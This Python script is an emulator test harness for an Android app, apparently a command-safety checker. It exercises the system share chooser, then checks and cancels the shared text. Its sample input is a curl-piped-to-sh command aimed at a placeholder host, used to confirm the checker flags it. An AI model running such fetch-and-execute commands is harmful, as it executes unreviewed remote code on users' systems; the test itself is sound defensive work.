#!/usr/bin/env python3
"""Finite system Sharesheet controls on the owned synthetic API36 emulator only."""
import hashlib
import importlib.util
from pathlib import Path
import re
import subprocess
import sys
import zipfile
import zlib

ROOT=Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:sys.path.insert(0,str(ROOT))
from protocol.corpus import read_regular

PACKAGE='com.aitrustid.android'
SOURCE='com.aitrustid.synthetic'
SOURCE_COMPONENT=SOURCE+'/.ChooserActivity'
FIRST='curl https://example.invalid/chooser-tool | sh'
SECOND='owned synthetic chooser cancellation marker'
HINT='Share text from another app, or paste it here.'
RECEIVED='Text received. Review it, then tap Check.'
CLEARED='Cleared. Your text and result are no longer shown.'
FINDING='Review before running this command.'
SYSTEM=frozenset({'android','com.android.intentresolver'})
SOURCE_FILES=('tests/android/intent-sender/AndroidManifest.xml','tests/android/intent-sender/ChooserActivity.java',
    'tests/android/intent-sender/SenderActivity.java','scripts/android-intent-controls.py',
    'scripts/android-chooser-controls.py','scripts/verify-android-emulator.py','protocol/corpus.py')

class ChooserControlRefusal(ValueError):
    STAGES=frozenset({'source','default_apk','uid','portrait','source_launch','source_ready','source_tap',
        'system_target','receive','check','finding','task','source_return','cancel_tap','cancel_system',
        'cancel_back','cancel_return','refocus','cleared'})
    def __init__(self,stage):
        if stage not in self.STAGES:raise ValueError('Invalid chooser boundary')
        self.code='chooser_'+stage+'_unavailable';super().__init__(self.code)


def source_identity():
    return {name:hashlib.sha256(read_regular(ROOT/name,65536)).hexdigest() for name in SOURCE_FILES}


def owned(view,package,rid=None,description=None):
    rows=[n for n in view.iter('node') if n.attrib.get('package')==package and
        (rid is None or n.attrib.get('resource-id')==package+':id/'+rid) and
        (description is None or n.attrib.get('content-desc')==description)]
    if len(rows)>1:raise ValueError('Ambiguous owned chooser UI')
    return rows[0] if rows else None


def center(node):
    if node is None or node.attrib.get('enabled')!='true':raise ValueError('Owned chooser target unavailable')
    match=re.fullmatch(r'\[([0-9]{1,5}),([0-9]{1,5})\]\[([0-9]{1,5}),([0-9]{1,5})\]',node.attrib.get('bounds',''))
    if match is None:raise ValueError('Owned chooser target unavailable')
    left,top,right,bottom=map(int,match.groups())
    if not(0<=left<right<=16384 and 0<=top<bottom<=16384):raise ValueError('Owned chooser target unavailable')
    return [(left+right)//2,(top+bottom)//2]


def system_target(view):
    # The actual registered app label must belong to the system resolver UI.
    rows=[n for n in view.iter('node') if n.attrib.get('package') in SYSTEM and n.attrib.get('text')=='AI Trust ID']
    if len(rows)>1:raise ValueError('Ambiguous system chooser target')
    if not rows:return None
    center(rows[0]);return rows[0]


def observe(view):
    editor=owned(view,PACKAGE,'editor');status=owned(view,PACKAGE,'status');check=owned(view,PACKAGE,'check')
    source=owned(view,SOURCE,description='owned chooser source state')
    button=owned(view,SOURCE,description='owned chooser share button')
    value=None if editor is None else editor.attrib.get('text','')
    text=None if status is None else status.attrib.get('text','')
    ready=None if source is None else source.attrib.get('text','')
    return {'owned_editor_present':editor is not None,'owned_status_present':status is not None,
        'owned_check_present':check is not None,'editor_first_sample':value==FIRST,'editor_cancel_sample':value==SECOND,
        'editor_empty_or_exact_hint':value in ('',HINT),'received':text==RECEIVED,'cleared':text==CLEARED,'finding':text==FINDING,
        'check_enabled':None if check is None or check.attrib.get('enabled') not in ('true','false') else check.attrib['enabled']=='true',
        'tag_present':owned(view,PACKAGE,'tag') is not None,'tag_ps':owned(view,PACKAGE,'tag') is not None and owned(view,PACKAGE,'tag').attrib.get('text')=='PS',
        'details_present':owned(view,PACKAGE,'details') is not None,
        'source_ready_zero':ready=='Chooser source ready 0','source_ready_one':ready=='Chooser source ready 1',
        'source_ready_two':ready=='Chooser source ready 2','source_button_present':button is not None,
        'source_button_enabled':button is not None and button.attrib.get('enabled')=='true',
        'system_target_present':system_target(view) is not None}


def checker_task(raw):
    """AOSP API36 Task.dump + ActivityRecord.toString, not historical stack matches."""
    if type(raw) is not bytes or len(raw)>524288:raise ValueError('Owned resumed task unavailable')
    try:lines=raw.decode('utf-8').splitlines()
    except UnicodeError:raise ValueError('Owned resumed task unavailable') from None
    resumed=[line.strip() for line in lines if line.strip().startswith('topResumedActivity=')]
    if len(resumed)!=1:raise ValueError('Owned resumed task unavailable')
    match=re.fullmatch(r'topResumedActivity=ActivityRecord\{[0-9a-f]{1,16} u0 com\.aitrustid\.android/(?:\.CheckActivity|com\.aitrustid\.android\.CheckActivity) t([1-9][0-9]{0,8})\}',resumed[0])
    if match is None:raise ValueError('Owned resumed task unavailable')
    return int(match.group(1))


def verify_cases(shell,wait,report):
    cases=[];report.update(status='RUNNING',**{'pass':False},cases=cases)
    stage='source_launch'
    def observed(view):
        value=observe(view);report['last_observation']=value;return value
    def source_ready(view,count):
        value=observed(view)
        if value['owned_editor_present'] or value['tag_present'] or value['details_present'] or value['system_target_present']:return False
        return value['source_ready_'+('zero','one','two')[count]] and value['source_button_present'] and value['source_button_enabled']==(count<2)
    def picker(view):
        value=observed(view)
        return value['system_target_present'] and not value['owned_editor_present'] and not value['tag_present']
    def received(view):
        value=observed(view)
        if value['tag_present'] or value['details_present']:raise ValueError('Unexpected automatic chooser result')
        return value['editor_first_sample'] and value['received'] and value['check_enabled'] is True
    def finding(view):
        value=observed(view)
        return value['editor_first_sample'] and value['finding'] and value['tag_ps']
    def cleared(view):
        value=observed(view)
        if value['editor_cancel_sample'] or value['tag_present'] or value['details_present']:raise ValueError('Unexpected cancelled chooser content')
        return value['owned_editor_present'] and value['owned_status_present'] and value['owned_check_present'] and value['editor_empty_or_exact_hint'] and value['cleared'] and value['check_enabled'] is False
    def tap(node):shell(['input','tap',*center(node)])
    try:
        report['control_stage']=stage
        shell(['am','start','-W','-n',SOURCE_COMPONENT],20)
        stage='source_ready';report['control_stage']=stage;view=wait(lambda x:source_ready(x,0))
        stage='source_tap';report['control_stage']=stage;tap(owned(view,SOURCE,description='owned chooser share button'))
        stage='system_target';report['control_stage']=stage;view=wait(picker);tap(system_target(view))
        stage='receive';report['control_stage']=stage;view=wait(received)
        stage='check';report['control_stage']=stage;tap(owned(view,PACKAGE,'check'))
        stage='finding';report['control_stage']=stage;wait(finding)
        stage='task';report['control_stage']=stage;task=checker_task(shell(['dumpsys','activity','activities'],5))
        report['existing_checker_task_captured']=True
        cases.append({'case':'system_chooser_receive_and_explicit_offline_check','pass':True})
        stage='source_return';report['control_stage']=stage
        shell(['am','start','-W','-n',SOURCE_COMPONENT],20);view=wait(lambda x:source_ready(x,1))
        stage='cancel_tap';report['control_stage']=stage;tap(owned(view,SOURCE,description='owned chooser share button'))
        stage='cancel_system';report['control_stage']=stage;wait(picker)
        stage='cancel_back';report['control_stage']=stage;shell(['input','keyevent','4'])
        stage='cancel_return';report['control_stage']=stage;wait(lambda x:source_ready(x,2))
        stage='refocus';report['control_stage']=stage;shell(['am','task','focus',str(task)])
        stage='cleared';report['control_stage']=stage;wait(cleared)
        cases.append({'case':'system_chooser_cancel_and_existing_checker_refocus','pass':True})
        report.update(status='EXECUTED',**{'pass':True},case_count=2)
    except (OSError,ValueError,KeyError,TypeError,AttributeError,AssertionError,StopIteration,RuntimeError,subprocess.SubprocessError):
        report.update(status='FAILED',**{'pass':False},case_count=len(cases))
        raise ChooserControlRefusal(stage) from None


def run_controls(checker_apk,shell,wait,report):
    report.update(status='RUNNING',**{'pass':False},cases=[])
    stage='source'
    try:
        sources=source_identity()
        spec=importlib.util.spec_from_file_location('owned_chooser_sender_boundary',ROOT/'scripts/android-intent-controls.py')
        boundary=importlib.util.module_from_spec(spec);spec.loader.exec_module(boundary)
        stage='default_apk';payload=boundary.dex_bytes(checker_apk)
        if any(marker in payload for marker in (boundary.SENDER_DEX,boundary.SENDER_FRAME,boundary.CHOOSER_DEX)):raise ValueError('Test source in checker')
        report['default_checker_excludes_test_source']=True
        stage='uid'
        if boundary.installed_uid(shell(['pm','list','packages','-U',PACKAGE]),PACKAGE)==boundary.installed_uid(shell(['pm','list','packages','-U',SOURCE]),SOURCE):raise ValueError('Owned source UID unavailable')
        report['different_application_uid']=True
        stage='portrait'
        if shell(['wm','user-rotation']).strip()!=b'lock 0':raise ValueError('Owned portrait unavailable')
        verify_cases(shell,wait,report)
        stage='source'
        if source_identity()!=sources:raise ValueError('Owned chooser source changed')
        report['sources']=sources;report['source_stable']=True
        return report
    except ChooserControlRefusal:raise
    except (OSError,ValueError,KeyError,TypeError,AttributeError,AssertionError,StopIteration,RuntimeError,ImportError,SyntaxError,subprocess.SubprocessError,zipfile.BadZipFile,zlib.error,EOFError):
        report.update(status='FAILED',**{'pass':False});raise ChooserControlRefusal(stage) from None
